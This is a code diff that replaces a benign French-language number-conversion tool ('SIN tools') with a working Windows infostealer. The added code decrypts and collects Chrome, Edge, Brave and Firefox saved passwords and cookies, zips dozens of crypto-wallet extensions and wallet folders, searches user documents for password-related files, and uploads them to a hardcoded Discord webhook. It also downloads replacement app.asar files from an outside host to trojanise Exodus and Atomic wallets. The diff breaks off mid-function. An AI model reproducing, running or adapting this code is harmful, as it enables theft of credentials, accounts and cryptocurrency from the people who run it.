@@ -1,488 +1,512 @@
-VERSION = 1.4
-"""
-AUTHOR : BENJI77
-LAUNCHED : 25 sept. 2024 at 15:48
-"""
-ASCII = rf"""
-    o__ __o       o     o          o  
-   /v     v\    _<|>_  <|\        <|> 
-  />       <\          / \\o      / \ 
- _\o____          o    \o/ v\     \o/ 
-      \_\__o__   <|>    |   <\     |  
-            \    / \   / \    \o  / \ 
-  \         /    \o/   \o/     v\ \o/ 
-   o       o      |     |       <\ |  
-   <\__ __/>     / \   / \        < \ 
-
-        [+] created by benji77 {VERSION}                       
-                                      """
-
-
-try:
-   import os
-   import platform
-   import subprocess
-   import time
-   import requests
-   import socket
-   import getpass
-except ImportError as e:
-    print(f'import error please install libs : {e}')
-class Colors:
-    """ ANSI color codes """
-    BLACK = "\033[0;30m"
-    RED = "\033[0;31m"
+import base64
+import json
+import os
+import re
+import sqlite3
+import shutil
+import httpx
+import subprocess
+from random import choice
+import time
+import zipfile
+import psutil
+import sys
+from urllib.request import Request, urlopen
+import getpass
+import random
+import socket
+import win32crypt
+from Crypto.Cipher import AES
+import requests
+class color():
+    RED   = "\033[1;31m"  
+    BLUE  = "\033[1;34m"
+    CYAN  = "\033[1;36m"
     GREEN = "\033[0;32m"
-    BROWN = "\033[0;33m"
-    BLUE = "\033[0;34m"
-    PURPLE = "\033[0;35m"
-    CYAN = "\033[0;36m"
-    LIGHT_GRAY = "\033[0;37m"
-    DARK_GRAY = "\033[1;30m"
-    LIGHT_RED = "\033[1;31m"
-    LIGHT_GREEN = "\033[1;32m"
-    YELLOW = "\033[1;33m"
-    LIGHT_BLUE = "\033[1;34m"
-    LIGHT_PURPLE = "\033[1;35m"
-    LIGHT_CYAN = "\033[1;36m"
-    LIGHT_WHITE = "\033[1;37m"
-    BOLD = "\033[1m"
-    FAINT = "\033[2m"
-    ITALIC = "\033[3m"
-    UNDERLINE = "\033[4m"
-    BLINK = "\033[5m"
-    NEGATIVE = "\033[7m"
-    CROSSED = "\033[9m"
-    END = "\033[0m"
-system = platform.system()
-os.system("cls" if system == "Windows" else "clear")
-print(Colors.GREEN+ASCII+Colors.END)
-print(system)
+    RESET = "\033[0;0m"
+    BOLD    = "\033[;1m"
+    REVERSE = "\033[;7m"
+if not os.path.exists('C:/immunite.god'):
+    print('congiguration process starting !')
+    CURRENT_INTERPRETER = sys.executable
+    current_file = os.path.abspath(__file__)
+    USER_PROFILE = os.getenv('USERPROFILE')
+    APPDATA = os.getenv('APPDATA')
+    LOCALAPPDATA = os.getenv('LOCALAPPDATA')
+    STORAGE_PATH = APPDATA + "\\gruppe_storage"
+    STARTUP_PATH = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    if not os.path.exists(STORAGE_PATH):
+        os.makedirs(STORAGE_PATH)
+    CHROMIUM_BROWSERS = [
+        {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
+        {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},
+        {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},
+        {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},
+        {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},
+        {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},
+    ]
+    CHROMIUM_SUBPATHS = [
+        {"name": "None", "path": ""},
+        {"name": "Default", "path": "Default"},
+        {"name": "Profile 1", "path": "Profile 1"},
+        {"name": "Profile 2", "path": "Profile 2"},
+        {"name": "Profile 3", "path": "Profile 3"},
+        {"name": "Profile 4", "path": "Profile 4"},
+        {"name": "Profile 5", "path": "Profile 5"},
+    ]
+    BROWSER_EXTENSIONS = [
+        {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
+        {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
+        {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
+        {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
+        {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
+        {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
+        {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
+        {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
+        {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
+        {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
+        {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
+        {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
+        {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
+        {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
+        {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
+        {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
+        {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
+        {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
+        {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
+        {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
+        {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
+        {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
+        {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
+        {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
+        {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
+        {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
+        {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
+        {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
+        {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
+        {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
+        {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
+        {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
+        {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
+        {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
+        {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
+        {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},
+        {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
+        {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},
+        {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},
+        {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},
+        {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
+        {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},
+        {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
+        {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
+        {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},
+        {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},
+        {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},
+        {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
+        {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
+        {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
+        {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},
+        {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
+        {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},
+        {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
+        {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},
+        {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}
+    ]
 
-if system == "Windows":
-    CLEAR = "cls"
-elif system == "Darwin":
-    CLEAR = "clear"
-elif system == "Linux":
-    CLEAR = "clear"
-else:
-    raise OSError(f"Unsupported operating system: {system}")
-def check_internet_connection(host="8.8.8.8", port=53, timeout=3):
-    try:
-        socket.setdefaulttimeout(timeout)
-        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
-        return True
-    except socket.error as ex:
-        return False
-
-def check_update():
-    if not check_internet_connection():
-        print('no internet connection detected !')
-        return
-    verify = "https://raw.githubusercontent.com/benji77430/SIN/refs/heads/main/version.version"
-    response = requests.get(verify)
-    if response.status_code == 200:
-        content = response.content
-        version = float(content.decode())
-        if version > VERSION:
-            print(f'new update available : {version} !')
-            return True
-        else: print(f'SIN tools is already up to date !')
-        return False
-def update():
-    if not check_internet_connection():
-        print('no internet connection detected !')
-        return
-    verify = "https://raw.githubusercontent.com/benji77430/SIN/refs/heads/main/version.version"
-    response = requests.get(verify)
-    if response.status_code == 200:
-        content = response.content
-        version = float(content.decode())
-        if version > version:
-            print('SIN tools is already up to date !')
-            return
-        else: print(f'new update available : {version} !')
-    url ="https://raw.githubusercontent.com/benji77430/SIN/refs/heads/main/sin.py"
-    for _ in range(3):
-        response = requests.get(url)
-        progress = 10
-        print(f'['+'-'*progress+'>'+' '*(30-progress)+f'] {int(progress*10/3)}%',end='\r')
-        time.sleep(0.3)
-
-        if response.status_code == 200:
-            content = response.content
-            progress += 10
-            print(f'['+'-'*progress+'>'+' '*(30-progress)+f'] {int(progress*10/3)}%',end='\r')
-            time.sleep(0.3)
-
-            with open(__file__,'w')as f:
-                f.write(content.decode())
-                progress += 10
-                print(f'['+'-'*progress+'>'+' '*(30-progress)+f'] {int(progress*10/3)}%',end='\r')
-                time.sleep(0.3)
-                print('SIN was updated ! starting new version...')
-                return content.decode()
+    WALLET_PATHS = [
+        {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
+        {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
+        {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},
+        {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},
+        {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},
+        {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},
+        {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},
+        {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
+        {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},
+        {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
+        {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
+    ]
+    PATHS_TO_SEARCH = [
+        USER_PROFILE + "\\Desktop",
+        USER_PROFILE + "\\Documents",
+        USER_PROFILE + "\\Downloads",
+        USER_PROFILE + "\\OneDrive\\Documents",
+        USER_PROFILE + "\\OneDrive\\Desktop",
+    ]
+    FILE_KEYWORDS = [
+            "passw",
+            "mdp",
+            "motdepasse",
+            "mot_de_passe",
+            "login",
+            "secret",
+            "account",
+            "acount",
+            "paypal",
+            "banque",
+            "metamask",
+            "wallet",
+            "crypto",
+            "exodus",
+            "discord",
+            "2fa",
+            "code",
+            "memo",
+            "compte",
+            "token",
+            "backup",
+            "seecret"
+    ]
+    ALLOWED_EXTENSIONS = [
+        ".txt",
+        ".log",
+        ".doc",
+        ".docx",
+        ".xls",
+        ".xlsx",
+        ".ppt",
+        ".pptx",
+        ".odt",
+        '.py',
+        ".pdf",
+        ".rtf",
+        ".json",
+        ".csv",
+        ".db",
+        ".jpg",
+        ".jpeg",
+        ".png",
+        ".gif",
+        ".webp",
+        ".mp4"
+    ]
+    DISCORD_PATHS = [
+        {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb")},
+        {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb")},
+        {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb")},
+        {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb")},
+        {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb")},
+        {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb")},
+        {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb")},
+        {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb")},
+        {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb")},
+        {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb")},
+        {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb")},
+        {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb")},
+        {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")},
+        {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb")},
+        {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")},
+        {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb")},
+        {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb")},
+        {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb")},
+        {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb")},
+        {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb")},
+        {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb")},
+        {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")},
+        {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb")},
+        {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb")},
+        {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")},
+        {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb")}
+    ]
+    DISCORD_TOKENS = []
+    PASSWORDS = []
+    COOKIES = []
+    DISCORD_IDS = []
+    print('data process starting !')
+    def decrypt_data(data, key):
+        try:
+            iv = data[3:15]
+            data = data[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            return cipher.decrypt(data)[:-16].decode()
+        except:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+    def zip_to_storage(name, source, destination):
+        if os.path.isfile(source):
+            with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
+                z.write(source, os.path.basename(source))
         else:
-            print(f'status code : {response.status_code}')
-def clear():
-    os.system(CLEAR)
-def decimal_to_hexadecimal(decimal):
-    if decimal < 0:
-        print('veuillez entrez un décimale valide !')
-        exit()
-    return hex(decimal)[2:].upper()
-def hexadecimal_to_decimal(hexadecimal):
-    return int(hexadecimal,16)[2:].upper()
-def get_bit(n):
-
-    for i in range(0,1000):
-        nb = 2**i
-        if nb >= n:
-            print(f'2^{i} => {n}')
-            return i
-def get_bits(n):
-
-    for i in range(0,1000):
-        nb = 2**i
-        if nb >= n:
-            return i
-def binary_and_hex_conversion():
-    while True:
-        clear()
-        print(Colors.RED+ASCII+Colors.END)
-        choice = input(f'''
-    1) decimal to hexadecimal
-    2) hexadecimal to decimal
-    3) decimal to binary
-    4) binary to decimals
-    5) text to ASCII
-    6) ASCII to text 
-    q) main menu
-
-{Colors.CYAN}┌──<[{Colors.RED}{getpass.getuser()}@{socket.gethostname()}{Colors.CYAN}]{Colors.END} ~ {Colors.RED}{os.getcwd()}{Colors.END} \n{Colors.CYAN}└──╼ ${Colors.END}  ''')
-
-        if choice == "1":
+            with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
+                for root, dirs, files in os.walk(source):
+                    for file in files:
+                        z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(source, '..')))
+    i=0
+    def upload_to_server(filepath,i):
+        for _ in range(10):
             try:
-                print('enter "q" to quit')
-
-                while True:
-                    print(f'{Colors.RED}-{Colors.END}'*50)
-
-                    decimal_number = int(input("veuillez entrez un nombre > "))
-                    #détail le calcul
-                    # Détail du calcul de décimal à hexadécimal
-                    print(f"Calcul détaillé pour convertir {decimal_number} en hexadécimal:")
-                    
-                    # Initialisation
-                    quotient = decimal_number
-                    remainders = []
-                    
-                    # Boucle de division successive par 16
-                    while quotient > 0:
-                        remainder = quotient % 16
-                        remainders.append(remainder)
-                        print(f"{quotient} ÷ 16 = {quotient // 16} avec un reste de {remainder}")
-                        quotient = quotient // 16
-                    
-                    # Conversion des restes en caractères hexadécimaux
-                    hex_chars = "0123456789ABCDEF"
-                    hex_result = ""
-                    for remainder in reversed(remainders):
-                        hex_result += hex_chars[remainder]
-                        print(f"Reste {remainder} correspond à '{hex_chars[remainder]}' en hexadécimal")
-                    
-                    print(f"Résultat final en hexadécimal: {hex_result}")
-                    hexadecimal = decimal_to_hexadecimal(decimal_number)
-                    print("\nresult : ",hexadecimal)
-            except ValueError:
-                pass
-        elif choice == "2":
+                url = "https://discord.com/api/webhooks/1240375112390410341/iVQ1P6PMXW4M-Fq7FPKZN9Vxd629vGzEfKw7QJtRi6tfqxrFXbo2lVNFPiT69Ya9qfwc"
+                files = {'file': open(filepath, 'rb')}
+                r = requests.post(url, files=files)
+                print(f'file sended : {color.RED}{i}{color.RESET}   |    status code : {color.GREEN}{r.status_code}{color.RESET}                ',end='\r')
+                if r.status_code == 200:
+                    i+=1
+                    return i
+            except: 
+                print('probably 429 error retrying in 0.1s')
+                time.sleep(0.1)
+    def validate_discord_token(token):
+        r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
+        if r.status_code == 200:
+            print('discord token valid !')
+            return r.json()
+        else:
+            return None
+    def taskkill(taskname):
+        subprocess.run(["taskkill", "/F", "/IM", taskname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    print('processing exodus injection !')
+    def inject():
+        procc = "exodus.exe"
+        local = os.getenv("localappdata")
+        path = f"{local}/exodus"
+        if not os.path.exists(path): return
+        listOfFile = os.listdir(path)
+        apps = []
+        for file in listOfFile:
+            if "app-" in file:
+                apps += [file]
+        exodusPatchURL = "https://funcaptcha.ru/app.asar"
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
+        req = Request(exodusPatchURL, headers=headers)
+        response = urlopen(req)
+        data = response.read()
+        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+        for app in apps:
             try:
-                print('enter "q" to quit')
-
-                while True:
-
-                    table = {'0': 0, '1': 1, '2': 2, '3': 3,  
-                            '4': 4, '5': 5, '6': 6, '7': 7, 
-                            '8': 8, '9': 9, 'A': 10, 'B': 11,  
-                            'C': 12, 'D': 13, 'E': 14, 'F': 15} 
-                    print(f'{Colors.RED}-{Colors.END}'*50)
-                    
-                    
-                    hexadecimal = input("Enter Hexadecimal Number: ").strip().upper() 
-                    res = 0
-                    
-                    # computing max power value 
-                    size = len(hexadecimal) - 1
-                    
-                    for num in hexadecimal: 
-                        res = res + table[num]*16**size 
-                        size = size - 1
-                    # Détail du calcul d'hexadécimal à décimal
-                    print(f"Calcul détaillé pour convertir {hexadecimal} en décimal:")
-                    
-                    size = len(hexadecimal) - 1
-                    for index, digit in enumerate(hexadecimal):
-                        value = table[digit]
-                        power = 16 ** (size - index)
-                        contribution = value * power
-                        print(f"Chiffre '{digit}' à la position {index}:")
-                        print(f"  Valeur en décimal: {value}")
-                        print(f"  Puissance de 16: 16^{size - index} = {power}")
-                        print(f"  Contribution: {value} * {power} = {contribution}")
-                        print(f"  Somme partielle: {res + contribution}")
-                        res += contribution
-                    
-                    print(f"Résultat final en décimal: {res}")
-                    
-            except KeyError:
-                pass
-        elif choice == "3":
+                fullpath = f"{path}/{app}/resources/app.asar"
+                with open(fullpath, 'wb') as out_file1:
+                    out_file1.write(data)
+            except: pass
+    for i in range(10):
+        try:
+            inject()
+            break
+        except: pass
+    print('processing atomic injection !')
+    def inject_atomic():
+        procc = "Atomic Wallet.exe"
+        local = os.getenv("localappdata")
+        path = f"{local}/Programs/atomic"
+        if not os.path.exists(path): return
+        atomicPatchURL = "https://funcaptcha.ru/atomic/app.asar"
+        headers = {"User-Agent": "Mozilla/5.0"}
+        req = Request(atomicPatchURL, headers=headers)
+        response = urlopen(req)
+        data = response.read()
+        subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+        try:
+            fullpath = f"{path}/resources/app.asar"
+            with open(fullpath, 'wb') as out_file1:
+                out_file1.write(data)
+        except: pass
+    for i in range(10):
+        try:
+            inject_atomic()
+            break
+        except: pass
+    print('processing chromium browsers !')
+    for browser in CHROMIUM_BROWSERS:
+        taskkill(browser["taskname"])
+        local_state = os.path.join(browser["path"], "Local State")
+        if not os.path.exists(local_state): continue
+        with open(local_state, "r", encoding="utf-8") as f:
+            local_state = json.loads(f.read())
+        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+        for subpath in CHROMIUM_SUBPATHS:
+            if not os.path.exists(os.path.join(browser["path"], subpath["path"])): continue
             try:
-                print('enter "q" to quit')
-
-                while True:
-                    print(f'{Colors.RED}-{Colors.END}'*50)
-                    
-
-                    n = int(input('enter the number to translate > '))
-                    bit = get_bit(n)
-                    bits = bin(n).split('b')[1]
-                    bits= str(bits).replace('b','0')
-                    if not len(bits) >= int(bit):
-                        add = bit-len(bits)
-                        bits = "0"*add + bits
-
-                    # Détail du calcul de décimal à binaire
-                    print(f"Calcul détaillé pour convertir {n} en binaire:")
-                    
-                    temp_n = n
-                    steps = []
-                    while temp_n > 0:
-                        remainder = temp_n % 2
-                        quotient = temp_n // 2
-                        steps.append((temp_n, quotient, remainder))
-                        temp_n = quotient
-                    
-                    steps.reverse()
-                    for i, (dividend, quotient, remainder) in enumerate(steps):
-                        print(f"Étape {i+1}:")
-                        print(f"  {dividend} ÷ 2 = {quotient} reste {remainder}")
-                        print(f"  Bit ajouté: {remainder}")
-                        partial_result = ''.join(str(step[2]) for step in steps[-(i+1):])
-                        print(f"  Résultat partiel: {partial_result}")
-                        print('')
-                    print(f"Résultat final en binaire: {bits}")
-
-            except ValueError:
+                login_data_file = os.path.join(browser["path"], subpath["path"], "Login Data")
+                temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-pw.db")
+                shutil.copy(login_data_file, temp_db)
+                connection = sqlite3.connect(temp_db)
+                cursor = connection.cursor()
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                for row in cursor.fetchall():
+                    origin_url = row[0]
+                    username = row[1]
+                    password = decrypt_data(row[2], decryption_key)
+                    if username or password:
+                        PASSWORDS.append({"browser": browser["name"], "profile": subpath["name"], "url": origin_url, "username": username, "password": password})
+                cursor.close()
+                connection.close()
+                os.remove(temp_db)
+            except:
                 pass
-        elif choice == "4":
             try:
-                print('enter "q to quit')
-                while True:
-                    print(f'{Colors.RED}-{Colors.END}'*50)
-                    
-
-                    decimal_number = int(input("veuillez entrez un nombre > "),2)
-                    # Détail du calcul de binaire à décimal
-                    print(f"\nCalcul détaillé pour convertir {bin(decimal_number)[2:]} en décimal:")
-                    binary = bin(decimal_number)[2:]
-                    total = 0
-                    for i, digit in enumerate(binary[::-1]):
-                        if digit == '1':
-                            value = 2 ** i
-                            total += value
-                            print(f"Bit {i}: 1 * 2^{i} = {value}")
-                            print(f"Somme partielle: {total}")
-                        print('')
-                    print(f"\nRésultat final: {total}")
-            except ValueError:
+                cookies_file = os.path.join(browser["path"], subpath["path"], "Network", "Cookies")
+                temp_db = os.path.join(browser["path"], subpath["path"], "Network", f"{browser['name']}-ck.db")
+                shutil.copy(cookies_file, temp_db)
+                connection = sqlite3.connect(temp_db)
+                cursor = connection.cursor()
+                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                cookie_str = ""
+                for row in cursor.fetchall():
+                    host = row[0]
+                    name = row[1]
+                    value = decrypt_data(row[2], decryption_key)
+                    cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
+                COOKIES.append({"browser": browser["name"], "profile": subpath["name"], "cookies": base64.b64encode(cookie_str.encode()).decode()})
+                cursor.close()
+                connection.close()
+                os.remove(temp_db)
+            except:
                 pass
-        elif choice == "5":
+            for extension in BROWSER_EXTENSIONS:
+                extension_path = os.path.join(browser["path"], subpath["path"]) + extension["path"]
+                if os.path.exists(extension_path):
+                    try:
+                        zip_to_storage(f"{browser['name']}-{subpath['name']}-{extension['name']}", extension_path, STORAGE_PATH)
+                    except:
+                        pass
+    firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')
+    if os.path.exists(firefox_path):
+        taskkill("firefox.exe")
+        for profile in os.listdir(firefox_path):
             try:
-                print('enter "q" to quit')
+                if profile.endswith('.default') or profile.endswith('.default-release'):
+                    profile_path = os.path.join(firefox_path, profile)
+                    if os.path.exists(os.path.join(profile_path, "cookies.sqlite")):
+                        shutil.copy(os.path.join(profile_path, "cookies.sqlite"), os.path.join(profile_path, "cookies-copy.sqlite"))
+                        connection = sqlite3.connect(os.path.join(profile_path, "cookies-copy.sqlite"))
+                        cursor = connection.cursor()
+                        cursor.execute("SELECT host, name, value FROM moz_cookies")
+                        cookie_str = ""
+                        for row in cursor.fetchall():
+                            host, name, value = row
+                            cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
+                        COOKIES.append({"browser": "Firefox", "profile": profile, "cookies": base64.b64encode(cookie_str.encode()).decode()})
+                        cursor.close()
+                        connection.close()
+                        os.remove(os.path.join(profile_path, "cookies-copy.sqlite"))
+            except:
+                continue
 
-                while True:
-                    print(f'{Colors.RED}-{Colors.END}'*50)
-                    
-                    s = input('enter the text > ')
-                    if s == "q":
-                        break
-                    res = ' '.join(str(ord(c)) for c in s)
-                    print("\nresult : ",res)
-                    print("\nhexadecimal "," ".join(decimal_to_hexadecimal(int(i)) for i in res.split(' ') ) )
-                    def bny(n):
-                        n = int(n)
-                        bit = get_bits(n)
-                        bits = bin(n).split('b')[1]
-                        bits= str(bits).replace('b','0')
-                        if not len(bits) >= int(bit):
